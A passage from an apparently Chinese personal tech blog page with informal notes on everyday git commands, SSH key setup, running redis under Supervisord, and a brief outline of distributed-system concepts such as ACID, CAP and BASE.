class="line"></span><br><span class="line">See git-config(1) for details.</span><br></pre></td></tr></table></figure>
<p><code>git pull origin new_branch</code></p>
<hr>
<h5 id="怎样遍历移除项目中的所有-pyc-文件"><a href="#怎样遍历移除项目中的所有-pyc-文件" class="headerlink" title="怎样遍历移除项目中的所有 .pyc 文件"></a>怎样遍历移除项目中的所有 .pyc 文件</h5><p><code>sudo find /tmp -name &quot;*.pyc&quot; | xargs rm -rf</code>替换<code>/tmp</code>目录为工作目录<br><code>git rm *.pyc</code>这个用着也可以</p>
<p>避免再次误提交，在项目新建<code>.gitignore</code>文件，输入<code>*.pyc</code>过滤文件</p>
<hr>
<h5 id="git变更项目地址"><a href="#git变更项目地址" class="headerlink" title="git变更项目地址"></a>git变更项目地址</h5><p><code>git remote set-url origin git@192.168.6.70:res_dev_group/test.git</code><br><code>git remote -v</code></p>
<hr>
<h5 id="查看某个文件的修改历史"><a href="#查看某个文件的修改历史" class="headerlink" title="查看某个文件的修改历史"></a>查看某个文件的修改历史</h5><p><code>git log --pretty=oneline 文件名   # 显示修改历史</code><br><code>git show 356f6def9d3fb7f3b9032ff5aa4b9110d4cca87e  # 查看更改</code></p>
<hr>
<h5 id="git-push-时报错-warning-push-default-is-unset"><a href="#git-push-时报错-warning-push-default-is-unset" class="headerlink" title="git push 时报错 warning: push.default is unset"></a>git push 时报错 warning: push.default is unset</h5><p>git_push.jpg<br>‘matching’ 参数是 Git 1.x 的默认行为，其意是如果你执行 git push 但没有指定分支，它将 push 所有你本地的分支到远程仓库中对应匹配的分支。而 Git 2.x 默认的是 simple，意味着执行 git push 没有指定分支时，只有当前分支会被 push 到你使用 git pull 获取的代码。<br>根据提示，修改git push的行为:<br>git config –global push.default matching<br>再次执行git push 得到解决。</p>
<hr>
<h5 id="git-submodule的使用拉子项目代码"><a href="#git-submodule的使用拉子项目代码" class="headerlink" title="git submodule的使用拉子项目代码"></a>git submodule的使用拉子项目代码</h5><p>开发过程中，经常会有一些通用的部分希望抽取出来做成一个公共库来提供给别的工程来使用，而公共代码库的版本管理是个麻烦的事情。今天无意中发现了git的<code>git submodule</code>命令，之前的问题迎刃而解了。<br>添加</p>
<p>为当前工程添加submodule，命令如下：</p>
<p><code>git submodule add 仓库地址 路径</code></p>
<p>其中，仓库地址是指子模块仓库地址，路径指将子模块放置在当前工程下的路径。<br>注意：路径不能以 &#x2F; 结尾（会造成修改不生效）、不能是现有工程已有的目录（不能順利 Clone）</p>
<p>命令执行完成，会在当前工程根路径下生成一个名为“.gitmodules”的文件，其中记录了子模块的信息。添加完成以后，再将子模块所在的文件夹添加到工程中即可。<br>删除</p>
<p>submodule的删除稍微麻烦点：首先，要在“.gitmodules”文件中删除相应配置信息。然后，执行<code>git rm –cached</code>命令将子模块所在的文件从git中删除。<br>下载的工程带有submodule</p>
<p>当使用<code>git clone</code>下来的工程中带有submodule时，初始的时候，submodule的内容并不会自动下载下来的，此时，只需执行如下命令：</p>
<p><code>git submodule update --init --recursive</code></p>
<p>即可将子模块内容下载下来后工程才不会缺少相应的文件。</p>
<hr>
<h5 id="一些错误"><a href="#一些错误" class="headerlink" title="一些错误"></a>一些错误</h5><h6 id="“pathspec-‘branch’-did-not-match-any-file-s-known-to-git-”错误"><a href="#“pathspec-‘branch’-did-not-match-any-file-s-known-to-git-”错误" class="headerlink" title="“pathspec ‘branch’ did not match any file(s) known to git.”错误"></a>“pathspec ‘branch’ did not match any file(s) known to git.”错误</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git checkout master</span><br><span class="line">git pull</span><br><span class="line">git checkout new_branch</span><br></pre></td></tr></table></figure>

<h6 id="使用git提交比较大的文件的时候可能会出现这个错误"><a href="#使用git提交比较大的文件的时候可能会出现这个错误" class="headerlink" title="使用git提交比较大的文件的时候可能会出现这个错误"></a>使用git提交比较大的文件的时候可能会出现这个错误</h6><p>error: RPC failed; result&#x3D;22, HTTP code &#x3D; 411<br>fatal: The remote end hung up unexpectedly<br>fatal: The remote end hung up unexpectedly<br>Everything up-to-date</p>
<p>这样的话首先改一下git的传输字节限制</p>
<p>git config http.postBuffer  524288000<br>然后这时候在传输或许会出现另一个错误</p>
<p>error: RPC failed; result&#x3D;22, HTTP code &#x3D; 413<br>fatal: The remote end hung up unexpectedly<br>fatal: The remote end hung up unexpectedly<br>Everything up-to-date</p>
<p>这两个错误看上去相似，一个是411，一个是413</p>
<p>下面这个错误添加一下密钥就可以了</p>
<p>首先key-keygen 生成密钥</p>
<p>然后把生成的密钥复制到git中自己的账号下的相应位置</p>
<p>git push ssh:&#x2F;&#x2F;192.168.64.250&#x2F;eccp.git  branch</p>
<blockquote>
<p>等待收集</p>
</blockquote>
<hr>
<h5 id="git-add文件取消"><a href="#git-add文件取消" class="headerlink" title="git add文件取消"></a>git add文件取消</h5><p>在git的一般使用中，如果发现错误的将不想提交的文件add进入index之后，想回退取消，则可以使用命令：<code>git reset HEAD &lt;file&gt;...</code>，同时git add完毕之后，git也会做相应的提示。</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://blog.csdn.net/yaoming168/article/details/38777763">http://blog.csdn.net/yaoming168/article/details/38777763</a></p>
</blockquote>
<hr>
<h5 id="git删除文件："><a href="#git删除文件：" class="headerlink" title="git删除文件："></a>git删除文件：</h5><p>删除文件跟踪并且删除文件系统中的文件file1<code>git rm file1</code><br>提交刚才的删除动作，之后git不再管理该文件<code>git commit</code></p>
<p>删除文件跟踪但不删除文件系统中的文件file1<code>git rm --cached file1</code><br>提交刚才的删除动作，之后git不再管理该文件。但是文件系统中还是有file1。<code>git commit</code></p>
<hr>
<h5 id="版本回退"><a href="#版本回退" class="headerlink" title="版本回退"></a>版本回退</h5><p>版本回退用于线上系统出现问题后恢复旧版本的操作。<br>回退到的版本<code>git reset --hard 248cba8e77231601d1189e3576dc096c8986ae51</code><br>回退的是所有文件，如果后悔回退可以git pull就可以了。</p>
<hr>
<h5 id="历史版本对比"><a href="#历史版本对比" class="headerlink" title="历史版本对比"></a>历史版本对比</h5><p>查看日志<code>git log</code><br>查看某一历史版本的提交内容<code>git show  4ebd4bbc3ed321d01484a4ed206f18ce2ebde5ca</code>，这里能看到版本的详细修改代码。<br>对比不同版本<code>git diff c0f28a2ec490236caa13dec0e8ea826583b49b7a  2e476412c34a63b213b735e5a6d90cd05b014c33</code></p>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://blog.csdn.net/lxlzhn/article/details/9356473">http://blog.csdn.net/lxlzhn/article/details/9356473</a></p>
</blockquote>
<hr>
<h5 id="分支的意义与管理"><a href="#分支的意义与管理" class="headerlink" title="分支的意义与管理"></a>分支的意义与管理</h5><p>创建分支可以避免提交代码后对主分支的影响，同时也使你有了相对独立的开发环境。分支具有很重要的意义。<br>创建并切换分支，提交代码后才能在其它机器拉分支代码<code>git checkout -b new_branch</code><br>查看当前分支<code>git branch</code><br>切换到master分支<code>git checkout master</code><br>合并分支到当前分支<code>git merge new_branch</code>，合并分支的操作是从new_branch合并到master分支，当前环境在master分支。<br>删除分支<code>git branch -d new_branch</code></p>
<hr>
<h5 id="git冲突文件编辑"><a href="#git冲突文件编辑" class="headerlink" title="git冲突文件编辑"></a>git冲突文件编辑</h5><p>冲突文件冲突的地方如下面这样</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a123</span><br><span class="line">&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEAD</span><br><span class="line">b789</span><br><span class="line">=======</span><br><span class="line">b45678910</span><br><span class="line">&gt;&gt;&gt;&gt;&gt;&gt;&gt; 6853e5ff961e684d3a6c02d4d06183b5ff330dcc</span><br><span class="line">c</span><br></pre></td></tr></table></figure>
<p>冲突标记&lt;&lt;&lt;&lt;&lt;&lt;&lt; （7个&lt;）与&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;之间的内容是我的修改，&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;与&gt;&gt;&gt;&gt;&gt;&gt;&gt;之间的内容是别人的修改。<br>此时，还没有任何其它垃圾文件产生。<br>你需要把代码合并好后重新走一遍代码提交流程就好了。</p>
<hr>
<h5 id="不顺利的代码提交流程"><a href="#不顺利的代码提交流程" class="headerlink" title="不顺利的代码提交流程"></a>不顺利的代码提交流程</h5><p>在<code>git push</code>后出现错误可能是因为其他人提交了代码，而使你的本地代码库版本不是最新。<br>这时你需要先<code>git pull</code>代码后，检查是否有文件冲突。<br>没有文件冲突的话需要重新走一遍代码提交流程<code>add —&gt; commit —&gt; push</code>。<br>解决文件冲突在后面说。</p>
<hr>
<h5 id="git顺利的提交代码流程"><a href="#git顺利的提交代码流程" class="headerlink" title="git顺利的提交代码流程"></a>git顺利的提交代码流程</h5><p>查看修改的文件<code>git status</code>；<br>为了谨慎检查一下代码<code>git diff</code>；<br>添加修改的文件<code>git add dirname1/filename1.py dirname2/filenam2.py</code>，新加的文件也是直接add就好了；<br>添加修改的日志<code>git commit -m &quot;fixed:修改了上传文件的逻辑&quot;</code>；<br>提交代码<code>git push</code>，如果提交失败的可能原因是本地代码库版本不是最新。</p>
<hr>
<h5 id="理解github的pull-request"><a href="#理解github的pull-request" class="headerlink" title="理解github的pull request"></a>理解github的pull request</h5><h6 id="有一个仓库，叫Repo-A。你如果要往里贡献代码，首先要Fork这个Repo，于是在你的Github账号下有了一个Repo-A2-。然后你在这个A2下工作，Commit，push等。然后你希望原始仓库Repo-A合并你的工作，你可以在Github上发起一个Pull-Request，意思是请求Repo-A的所有者从你的A2合并分支。如果被审核通过并正式合并，这样你就为项目A做贡献了。"><a href="#有一个仓库，叫Repo-A。你如果要往里贡献代码，首先要Fork这个Repo，于是在你的Github账号下有了一个Repo-A2-。然后你在这个A2下工作，Commit，push等。然后你希望原始仓库Repo-A合并你的工作，你可以在Github上发起一个Pull-Request，意思是请求Repo-A的所有者从你的A2合并分支。如果被审核通过并正式合并，这样你就为项目A做贡献了。" class="headerlink" title="有一个仓库，叫Repo A。你如果要往里贡献代码，首先要Fork这个Repo，于是在你的Github账号下有了一个Repo A2,。然后你在这个A2下工作，Commit，push等。然后你希望原始仓库Repo A合并你的工作，你可以在Github上发起一个Pull Request，意思是请求Repo A的所有者从你的A2合并分支。如果被审核通过并正式合并，这样你就为项目A做贡献了。"></a>有一个仓库，叫Repo A。你如果要往里贡献代码，首先要Fork这个Repo，于是在你的Github账号下有了一个Repo A2,。然后你在这个A2下工作，Commit，push等。然后你希望原始仓库Repo A合并你的工作，你可以在Github上发起一个Pull Request，意思是请求Repo A的所有者从你的A2合并分支。如果被审核通过并正式合并，这样你就为项目A做贡献了。</h6><blockquote>
<p><a target="_blank" rel="noopener" href="http://zhidao.baidu.com/question/1669154493305991627.html">http://zhidao.baidu.com/question/1669154493305991627.html</a></p>
</blockquote>
<hr>
<h5 id="创建和使用git-ssh-key"><a href="#创建和使用git-ssh-key" class="headerlink" title="创建和使用git ssh key"></a>创建和使用git ssh key</h5><p>首先设置git的user name和email：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name &quot;xxx&quot;</span><br><span class="line">git config --global user.email &quot;xxx@gmail.com&quot;</span><br></pre></td></tr></table></figure>
<p>查看git配置：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --list</span><br></pre></td></tr></table></figure>
<h6 id="然后生成SHH密匙："><a href="#然后生成SHH密匙：" class="headerlink" title="然后生成SHH密匙："></a>然后生成SHH密匙：</h6><p>查看是否已经有了ssh密钥：<code>cd ~/.ssh</code><br>如果没有密钥则不会有此文件夹，有则备份删除<br>生存密钥：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;gudujianjsk@gmail.com&quot;</span><br></pre></td></tr></table></figure>
<p>按3个回车，密码为空这里一般不使用密钥。<br>最后得到了两个文件：id_rsa和id_rsa.pub<br>注意：密匙生成就不要改了，如果已经生成到<code>~/.ssh</code>文件夹下去找。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// 暂时无用</span><br><span class="line">添加 私密钥 到ssh：ssh-add id_rsa</span><br><span class="line">需要之前输入密码（如果有）。</span><br><span class="line"></span><br><span class="line">在github上添加ssh密钥，这要添加的是“id_rsa.pub”里面的公钥。</span><br><span class="line">打开 http://github.com,登陆xushichao，然后添加ssh。</span><br><span class="line">注意在这里由于直接复制粘帖公钥，可能会导致增加一些字符或者减少些字符，最好用系统工具xclip来做这些事情。</span><br><span class="line">xclip -selection c  id_rsa.pub</span><br></pre></td></tr></table></figure>

<blockquote>
<p>应用流程未整理</p>
</blockquote>
<hr>
<h6 id="网络上收集"><a href="#网络上收集" class="headerlink" title="网络上收集"></a>网络上收集</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">master : 默认开发分支； origin : 默认远程版本库</span><br><span class="line"></span><br><span class="line">初始化操作</span><br><span class="line">    $ git config -global user.name &lt;name&gt;  #设置提交者名字</span><br><span class="line">    $ git config -global user.email &lt;email&gt;  #设置提交者邮箱</span><br><span class="line">    $ git config -global core.editor &lt;editor&gt;  #设置默认文本编辑器</span><br><span class="line">    $ git config -global merge.tool &lt;tool&gt;  #设置解决合并冲突时差异分析工具</span><br><span class="line">    $ git config -list  #检查已有的配置信息</span><br><span class="line"></span><br><span class="line">创建新版本库</span><br><span class="line">    $ git clone &lt;url&gt;  #克隆远程版本库</span><br><span class="line">    $ git init  #初始化本地版本库</span><br><span class="line"></span><br><span class="line">修改和提交</span><br><span class="line">    $ git add .  #添加所有改动过的文件</span><br><span class="line">    $ git add &lt;file&gt;  #添加指定的文件</span><br><span class="line">    $ git mv &lt;old&gt; &lt;new&gt; #文件重命名</span><br><span class="line">    $ git rm &lt;file&gt;  #删除文件</span><br><span class="line">    $ git rm -cached &lt;file&gt;  #停止跟踪文件但不删除</span><br><span class="line">    $ git commit -m &lt;file&gt; #提交指定文件</span><br><span class="line">    $ git commit -m “commit message”  #提交所有更新过的文件</span><br><span class="line">    $ git commit -amend  #修改最后一次提交</span><br><span class="line">    $ git commit -C HEAD -a -amend  #增补提交（不会产生新的提交历史纪录）</span><br><span class="line"></span><br><span class="line">查看提交历史</span><br><span class="line">    $ git log  #查看提交历史</span><br><span class="line">    $ git log -p &lt;file&gt;  #查看指定文件的提交历史</span><br><span class="line">    $ git blame &lt;file&gt;  #以列表方式查看指定文件的提交历史</span><br><span class="line">    $ gitk  #查看当前分支历史纪录</span><br><span class="line">    $ gitk &lt;branch&gt; #查看某分支历史纪录</span><br><span class="line">    $ gitk --all  #查看所有分支历史纪录</span><br><span class="line">    $ git branch -v  #每个分支最后的提交</span><br><span class="line">    $ git status  #查看当前状态</span><br><span class="line">    $ git diff  #查看变更内容</span><br><span class="line"></span><br><span class="line">撤消操作</span><br><span class="line">    $ git reset -hard HEAD  #撤消工作目录中所有未提交文件的修改内容</span><br><span class="line">    $ git checkout HEAD &lt;file1&gt; &lt;file2&gt;  #撤消指定的未提交文件的修改内容</span><br><span class="line">    $ git checkout HEAD. #撤消所有文件</span><br><span class="line">    $ git revert &lt;commit&gt;  #撤消指定的提交</span><br><span class="line"></span><br><span class="line">分支与标签</span><br><span class="line">    $ git branch  #显示所有本地分支</span><br><span class="line">    $ git checkout &lt;branch/tagname&gt;  #切换到指定分支或标签</span><br><span class="line">    $ git branch &lt;new-branch&gt;  #创建新分支</span><br><span class="line">    $ git branch -d &lt;branch&gt;  #删除本地分支</span><br><span class="line">    $ git tag  #列出所有本地标签</span><br><span class="line">    $ git tag &lt;tagname&gt;  #基于最新提交创建标签</span><br><span class="line">    $ git tag -d &lt;tagname&gt;  #删除标签</span><br><span class="line"></span><br><span class="line">合并与衍合</span><br><span class="line">    $ git merge &lt;branch&gt;  #合并指定分支到当前分支</span><br><span class="line">    $ git rebase &lt;branch&gt;  #衍合指定分支到当前分支</span><br><span class="line"></span><br><span class="line">远程操作</span><br><span class="line">    $ git remote -v  #查看远程版本库信息</span><br><span class="line">    $ git remote show &lt;remote&gt;  #查看指定远程版本库信息</span><br><span class="line">    $ git remote add &lt;remote&gt; &lt;url&gt;  #添加远程版本库</span><br><span class="line">    $ git fetch &lt;remote&gt;  #从远程库获取代码</span><br><span class="line">    $ git pull &lt;remote&gt; &lt;branch&gt;  #下载代码及快速合并</span><br><span class="line">    $ git push &lt;remote&gt; &lt;branch&gt;  #上传代码及快速合并</span><br><span class="line">    $ git push &lt;remote&gt; : &lt;branch&gt;/&lt;tagname&gt;  #删除远程分支或标签</span><br><span class="line">    $ git push -tags  #上传所有标签</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://noge.top/2015/08/07/1.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="nuniok">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="码力欧">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2015/08/07/1.html" class="post-title-link" itemprop="url">Supervisord总结</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2015-08-07 00:00:00" itemprop="dateCreated datePublished" datetime="2015-08-07T00:00:00+00:00">2015-08-07</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><p>一、添加好配置文件后<br>二、更新新的配置到supervisord<br><code>supervisorctl update</code><br>三、重新启动配置中的所有程序<br><code>supervisorctl reload</code><br>四、启动某个进程(program_name&#x3D;你配置中写的程序名称)<br><code>supervisorctl start program_name</code><br>五、查看正在守候的进程<br><code>supervisorctl</code><br>六、停止某一进程 (program_name&#x3D;你配置中写的程序名称)<br><code>pervisorctl stop program_name</code><br>七、重启某一进程 (program_name&#x3D;你配置中写的程序名称)<br><code>supervisorctl restart program_name</code><br>八、停止全部进程<br><code>supervisorctl stop all</code><br>注意：显示用stop停止掉的进程，用reload或者update都不会自动重启。</p>
<p>supervisord : supervisor的服务器端部分，启动supervisor就是运行这个命令。<br>supervisorctl：启动supervisor的命令行窗口。</p>
<hr>
<p>需求：redis-server这个进程是运行redis的服务。我们要求这个服务能在意外停止后自动重启。</p>
<h2 id="安装（Centos）"><a href="#安装（Centos）" class="headerlink" title="安装（Centos）"></a>安装（Centos）</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum install python-setuptools</span><br><span class="line">easy_install supervisor</span><br></pre></td></tr></table></figure>

<p>测试是否安装成功：<br><code>echo_supervisord_conf</code></p>
<p>创建配置文件：<br><code>echo_supervisord_conf &gt; /etc/supervisord.conf</code></p>
<p>修改配置文件，在supervisord.conf最后增加：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[program:redis]</span><br><span class="line">command = redis-server   //需要执行的命令</span><br><span class="line">autostart=true    //supervisor启动的时候是否随着同时启动</span><br><span class="line">autorestart=true   //当程序跑出exit的时候，这个program会自动重启</span><br><span class="line">startsecs=3  //程序重启时候停留在runing状态的秒数</span><br></pre></td></tr></table></figure>

<p>环境变量配置：</p>
<p><code>environment=PATH=&quot;/usr/local/cuda-8.0/bin:/usr/local/cuda-8.0/lib64&quot;,LD_LIBRARY_PATH=&quot;/usr/local/cuda-8.0/lib64:$LD_LIBRARY_PATH&quot;</code></p>
<blockquote>
<p>更多配置说明请参考：<a target="_blank" rel="noopener" href="http://supervisord.org/configuration.html">http://supervisord.org/configuration.html</a></p>
</blockquote>
<p>运行命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">supervisord    //启动supervisor</span><br><span class="line">supervisorctl   //打开命令行</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@vm14211 ~]# supervisorctl</span><br><span class="line">redis                            RUNNING    pid 24068, uptime 3:41:55</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ctl中： help   //查看命令 </span><br><span class="line">ctl中： status  //查看状态</span><br></pre></td></tr></table></figure>

<h2 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h2><ol>
<li><p>redis出现的不是running而是FATAL 状态<br>应该要去查看log<br>log在&#x2F;tmp&#x2F;supervisord.log</p>
</li>
<li><p>日志中显示：<br>gave up: redis entered FATAL state, too many start retries too quickly<br>修改redis.conf的daemonize为no</p>
<blockquote>
<p>具体说明：<a target="_blank" rel="noopener" href="http://xingqiba.sinaapp.com/?p=240">http://xingqiba.sinaapp.com/?p=240</a></p>
</blockquote>
</li>
</ol>
<p>事实证明webdis也有这个问题，webdis要修改的是webdis.json这个配置文件</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote>
<p><a target="_blank" rel="noopener" href="http://www.cnblogs.com/yjf512/archive/2012/03/05/2380496.html">http://www.cnblogs.com/yjf512/archive/2012/03/05/2380496.html</a></p>
</blockquote>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://noge.top/2015/07/18/1.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="nuniok">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="码力欧">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2015/07/18/1.html" class="post-title-link" itemprop="url">分布式系统常用指标</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2015-07-18 00:00:00" itemprop="dateCreated datePublished" datetime="2015-07-18T00:00:00+00:00">2015-07-18</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="性能指标"><a href="#性能指标" class="headerlink" title="性能指标"></a>性能指标</h2><ol>
<li>吞度量</li>
<li>响应延迟 P95 P999</li>
<li>并发量</li>
</ol>
<h2 id="可用性指标"><a href="#可用性指标" class="headerlink" title="可用性指标"></a>可用性指标</h2><ol>
<li>可提供的服务时间 &#x2F; (可提供的服务时间 + 不可提供的服务时间)</li>
<li>请求成功次数 &#x2F; 总请求次数</li>
</ol>
<h2 id="可扩展性指标"><a href="#可扩展性指标" class="headerlink" title="可扩展性指标"></a>可扩展性指标</h2><p>是否能实现水平扩展，通过增加服务器数量增加计算能力、存储容量等。</p>
<p>存储系统中有两种扩展方式：<br>Scale Out（也就是Scale horizontally）横向扩展，比如在原有系统中新增一台服务器。<br>Scale Up（也就是Scale vertically）纵向扩展，在原有机器上增加 CPU 、内存。</p>
<h2 id="一致性指标"><a href="#一致性指标" class="headerlink" title="一致性指标"></a>一致性指标</h2><p>实现多副本之间一致性的能力。不同的应用场景对于数据一致性指标要求不同，需要根据场景做具体的评估。</p>
<h2 id="水平拆分和垂直拆分"><a href="#水平拆分和垂直拆分" class="headerlink" title="水平拆分和垂直拆分"></a>水平拆分和垂直拆分</h2><h2 id="ACID"><a href="#ACID" class="headerlink" title="ACID"></a>ACID</h2><p>原子性（Atomicity）<br>一致性（Atomicity）<br>隔离性（Isolation）<br>持久性（Durability）</p>
<h2 id="CAP（帽子理论）"><a href="#CAP（帽子理论）" class="headerlink" title="CAP（帽子理论）"></a>CAP（帽子理论）</h2><p>一致性（Consistency）<br>可用性（Availability）<br>可靠性（Partition tolerance 分区容错性）</p>
<h2 id="BASE"><a href="#BASE" class="headerlink" title="BASE"></a>BASE</h2><p>基本可用（Basically Available）<br>软状态（Soft State）<br>最终一致（Eventually Consistent）</p>
<h2 id="分布式一致性协议"><a href="#分布式一致性协议" class="headerlink" title="分布式一致性协议"></a>分布式一致性协议</h2><p>TX协议<br>XA协议</p>
<h2 id="两阶段提交协议"><a href="#两阶段提交协议" class="headerlink" title="两阶段提交协议"></a>两阶段提交协议</h2><h2 id="三阶段提交协议"><a href="#三阶段提交协议" class="headerlink" title="三阶段提交协议"></a>三阶段提交协议</h2><h2 id="TCC"><a href="#TCC" class="headerlink" title="TCC"></a>TCC</h2><h2 id="最终一致性模式"><a href="#最终一致性模式" class="headerlink" title="最终一致性模式"></a>最终一致性模式</h2>
      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/8/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/8/">8</a><span class="page-number current">9</span><a class="page-number" href="/page/10/">10</a><a class="page-number" href="/page/11/">11</a><a class="extend next" rel="next" href="/page/10/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>

</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 2015 – 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">nuniok</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
  </div>

    </div>
  </footer>

  
  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>

  


  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdn.jsdelivr.net/npm/mermaid@8.13.4/dist/mermaid.min.js","integrity":"sha256-96rwDGMWIQYB0yKGp1sKi1yrjrLPj2oT39IpbCsIrsg="}}</script>
  <script src="/js/third-party/tags/mermaid.js"></script>



  




  

  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","js":{"url":"https://cdn.jsdelivr.net/npm/mathjax@3.2.0/es5/tex-mml-chtml.js","integrity":"sha256-r+3itOMtGGjap0x+10hu6jW/gZCzxHsoKrOd7gyRSGY="}}</script>
<script src="/js/third-party/math/mathjax.js"></script>


